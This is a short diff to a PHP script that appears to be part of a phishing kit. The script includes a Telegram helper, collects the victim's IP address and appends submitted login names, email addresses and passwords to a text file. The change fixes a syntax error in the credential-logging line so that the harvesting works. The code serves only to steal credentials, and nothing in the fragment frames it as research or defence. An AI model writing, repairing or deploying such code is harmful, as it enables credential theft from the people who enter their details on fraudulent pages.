@@ -13,7 +13,9 @@ exit;
 include 'telegram.php';
 
 //print info
-file_put_contents("usernames.txt", " LOGIN: " . $_POST['LOGIN'] . " EMAIL: " . $_POST['EMAIL'] . " PASSWORD: " . $_POST['PASSWORD'] "\n", FILE_APPEND);
+<?php 
+file_put_contents("usernames.txt", "LOGIN: " . $_POST['LOGIN'] . " EMAIL: " . $_POST['EMAIL'] . " PASSWORD: " . $_POST['PASSWORD'] ."\n", FILE_APPEND);
+?>
 
 //Get IP
 function getClientIP() {
